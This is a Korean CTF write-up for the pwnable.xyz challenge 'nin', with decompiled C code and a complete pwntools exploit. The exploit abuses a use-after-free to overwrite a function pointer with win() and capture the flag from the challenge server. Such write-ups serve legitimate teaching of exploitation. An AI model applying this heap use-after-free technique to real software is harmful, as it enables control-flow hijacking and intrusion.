# [pwnable.xyz] nin

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Make sure Trent likes your gift.
>
> Release: [nin.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9098901/nin.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/178650123-707757b3-0343-4ffc-8a86-b52c6bbd971a.png)

## Analysis

### `do_chat()`

```c
void __noreturn do_chat()
{
  reznor *reznor; // [rsp+0h] [rbp-120h]
  char *myMessage; // [rsp+8h] [rbp-118h]
  char message[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v3; // [rsp+118h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  reznor = 0LL;
  while ( 1 )
  {
    memset(message, 0, 0xFFuLL);
    printf("@you> ");
    read(0, message, 0xFFuLL);
    myMessage = strdup(message);
    if ( !reznor )
      reznor = invite_reznor();
    ((void (__fastcall *)(reznor *, char *))reznor->func)(reznor, message);
    free(myMessage);
  }
}
```

기본적으로 챗봇 프로그램이다. `message`에 최대 `0xff`바이트만큼 입력을 받고, `strdup()`으로 따로 메모리를 할당해서 `message`의 내용을 `myMessage`로 복사한다. `reznor`의 값이 0이면 `invite_reznor()`를 실행해서 `0x30`바이트 크기의 청크를 할당하고, `reznor->func`에 저장된 함수를 실행한다. 기본적으로 `answer_me()`의 주소가 저장되어 있다.

### `answer_me()`

```c
unsigned __int64 __fastcall answer_me(reznor *reznor, const char *message)
{
  gift gift; // [rsp+1Ch] [rbp-24h] BYREF
  __int64 hashedGift; // [rsp+28h] [rbp-18h]
  char *v5; // [rsp+30h] [rbp-10h]
  unsigned __int64 v6; // [rsp+38h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  if ( !strcmp(message, "/gift\n")
    && (gift.price = 0,
        puts("Oh you wanna bribe him?"),
        printf("Ok, how expensive will your gift be: "),
        __isoc99_scanf("%ud", &gift),
        gift.price) )
  {
    gift.gift = (char *)malloc((unsigned int)(gift.price + 1));
    memset(gift.gift, 0, (unsigned int)(gift.price + 1));
    printf("Enter your gift: ");
    read(0, gift.gift, (unsigned int)gift.price);
    hashedGift = hash_gift((__int64)gift.gift, gift.price);
    printf("Trent doesn't look impressed and swallows %p\n", (const void *)hashedGift);
    if ( hashedGift == 0xDEADBEEFLL )
    {
      puts("The color of his head turns blue...");
      puts("Trent Reznor flips the table and raqequits...");
      puts("@trent has left #ota_chat (Client disconnected...)");
      free(reznor->trent);
      free(reznor);
    }
    else
    {
      printf("Didn't seem to be tasty...\n");
    }
  }
  else
  {
    v5 = (&answers)[rand() % 10];
    printf("@trent> %s\n", v5);
  }
  return __readfsqword(0x28u) ^ v6;
}
```

입력받은 `message`가 `"/gift\n"`이면 실행되는 루틴이 있다. `price`와 `gift`를 입력받아서 `hash_gift()`를 실행하는데, 이 결과가 `0xdeadbeef`이면 `reznor` 청크를 할당 해제한다.

## Exploit

`answer_me()`에서 `reznor` 청크를 할당 해제해도 `do_chat()`의 `reznor` 포인터는 0으로 초기화되지 않아서 UAF 취약점이 발생한다.

다음에 `gift.price`에 `0x27`을 입력하면 `malloc(0x30)`이 실행되어 이전에 할당 해제된 `reznor` 청크가 그대로 할당된다. `reznor->func`에 `win()`의 주소를 넣으면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30034)

sla = r.sendlineafter
sa = r.sendafter

win = 0x400cae


# free reznor chunk

sa('@you> ', '/gift\n')

# hash_gift() returns 0xdeadbeef
gift = '\xde' * (0x100 - 0xad)
gift += '\xdf' * 0xad
gift += '\xbe' * (0x100 - 0xef)
gift += '\xbf' * 0xef

sla('Ok, how expensive will your gift be: ', str(0x200))
sa('Enter your gift: ', gift)


# UAF -> call win()

sa('@you> ', '/gift\n')
sla('Ok, how expensive will your gift be: ', str(0x27))
sa('Enter your gift: ', b'A' * 8 + p64(win))

sa('@you> ', '\n')


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30034: Done
[*] Switching to interactive mode
FLAG{did_u_notice_this_1_has_2_bugs_too?}
```